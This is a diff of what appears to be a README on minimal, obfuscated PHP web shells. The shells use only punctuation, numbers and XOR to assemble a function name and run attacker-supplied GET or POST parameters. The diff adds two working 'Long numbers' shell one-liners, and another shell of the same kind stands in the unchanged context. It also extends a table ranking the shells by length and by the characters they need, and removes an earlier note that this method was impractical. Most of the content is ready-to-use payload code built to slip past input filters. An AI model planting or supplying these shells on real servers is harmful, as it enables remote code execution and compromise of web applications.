@@ -79,17 +79,10 @@ So i started to investigate how this could be avoided, and found the following M
 4. Long numbers `9**99` => `2.9512665430653E+94`
 5. Char Increment `'A'++` => `B`
 
-Based on the found approaches I tried around which method would be the best fitting.
-I found out that version 4) would be hard to Exploit due to the nature of the long string.
-And the base from `E+` xor into anything would be to long. So I dumped this idea, and started working on the other three:
-
-* Array into String
-* Infinite result into string
-* Underscore constant
-* Char Increment
-
 The speciality of the `Underscore constant` is that this will only work on pre php8 
 versions since the use of underscore as constant was then removed.
+
+Some version mix methods to be able to create working shells.
 
 ## Array into String (will throw warnings)
 **GET**
@@ -130,19 +123,33 @@ versions since the use of underscore as constant was then removed.
 <?=[$_=([]..1)[0],++$_,++$_,$__=$_++,++$_,++$_,++$_,$__.=++$_,++$_,++$_,++$_,++$_,++$_,++$_,++$_,++$_,++$_,$_=$__.++$_,$__=$_(95).$_(80).$_(79).$_(83).$_(84),$$__[0]($$__[1])];
 ```
 ---
+## Long numbers
+**GET**
+```php
+<?=$_=(9**99...1)[15];$__=$_;$__++;$__++;$__++;$_=7002...1^-20.1..1^$_.$_.$_.$__;$$_[0]($$_[1]);
+```
+**POST**
+```php
+<?=$_=(9**99...1)[15];$_++;$_=4.08.$_^-89..-1^$_.$_.$_.$_;$__=$_[3];$_.=++$__;$$_[0]($$_[1]);
+```
+---
 
 ## Length Ranking
 
-| Rank | Version                     | Method | Length | Needed Chars           |
-|------|-----------------------------|--------|--------|------------------------|
-| 1    | Underscore constant         | GET    | 58     | <?=$_[].;(23^57)01     |
-| 2    | Array into String           | GET    | 63     | <?=$_[].1;3^-570()     |
-| 3    | Infinite result into string | GET    | 65     | <?=$_9*.1;80-^(\[4]+2) |
-| 4    | Underscore constant         | POST   | 65     | <?=$_[].;(34^1625)0    |
-| 5    | Array into String           | POST   | 68     | <?=$_[].1;34^-20()     |
-| 6    | Infinite result into string | POST   | 78     | <?=$_-9*.1;408^\[3]6() |
-| 7    | Char Increment              | GET    | 169    | <?=\[$_(].1)0,+957684; |
-| 8    | Char Increment              | POST   | 176    | <?=\[$_(].1)0,+958734; |
+| Rank | Version                     | Method | Length | Needed Chars            |
+|------|-----------------------------|--------|--------|-------------------------|
+| 1    | Underscore constant         | GET    | 58     | <?=$_[].;(23^57)01      |
+| 2    | Array into String           | GET    | 63     | <?=$_[].1;3^-570()      |
+| 3    | Infinite result into string | GET    | 65     | <?=$_9*.1;80-^(\[4]+2)  |
+| 4    | Underscore constant         | POST   | 65     | <?=$_[].;(34^1625)0     |
+| 5    | Array into String           | POST   | 68     | <?=$_[].1;34^-20()      |
+| 6    | Infinite result into string | POST   | 78     | <?=$_-9*.1;408^\[3]6()  |
+| 7    | Long numbers                | POST   | 93     | <?=$_(9*.1)\[5];+408^-3 |
+| 8    | Long numbers                | GET    | 96     | <?=$_(9*.1)\[5];+702^-  |
+| 9    | Char Increment              | GET    | 169    | <?=\[$_(].1)0,+957684;  |
+| 10   | Char Increment              | POST   | 176    | <?=\[$_(].1)0,+958734;  |
+
+
 
 To query the shells you can use the browser or these snippets:
 
